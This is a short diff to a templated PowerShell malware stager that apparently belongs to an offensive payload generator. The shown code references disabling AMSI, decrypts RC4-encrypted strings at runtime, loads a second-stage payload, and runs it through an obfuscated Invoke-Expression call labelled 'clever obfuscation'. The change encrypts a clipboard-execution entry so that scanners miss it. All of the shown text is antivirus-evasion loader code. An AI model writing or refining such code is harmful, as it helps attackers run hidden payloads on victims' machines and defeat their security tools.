@@ -25,6 +25,8 @@ function {{symbol_name("Decrypt-String")}} {
     "Failed to disable AMSI, aborting",
 ]%}
 
+${{symbol_name("clip_entry")}} = "{{exec_clipboard_entry|rc4encrypt}}"
+
 {% for s in strings %}
     $string{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s|rc4encrypt}}"
 {% endfor %}
@@ -61,4 +63,3 @@ ${{symbol_name("Code")}} = {{symbol_name("Transport-String")}} "{{stage2}}"
 
 {#clever obfuscation#}
 & (gcm i*k`e-e*n) ${{symbol_name("Code")}}
-{{exec_clipboard_entry}}
